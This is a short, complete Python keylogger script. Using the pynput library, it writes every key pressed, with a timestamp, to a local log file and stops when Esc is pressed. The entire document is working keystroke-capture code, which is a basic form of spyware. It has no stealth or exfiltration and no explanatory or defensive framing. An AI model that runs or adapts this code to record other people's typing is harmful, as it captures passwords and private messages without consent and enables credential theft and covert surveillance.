from pynput import keyboard
from datetime import datetime

LOG_FILE = "key_log.txt"

# Write the pressed key to a log file
def on_press(key):
    try:
        with open(LOG_FILE, "a") as log_file:
            key_str = str(key.char)
    except AttributeError:
        if key == key.space:
            key_str = " [SPACE] "
        elif key == key.enter:
            key_str = "\n[ENTER]\n"
        else:
            key_str = f" [{key.name.upper()}] "
    with open(LOG_FILE, "a") as log_file:
        log_file.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - {key_str}\n")

def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Stop listener when Esc is pressed

# Start keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
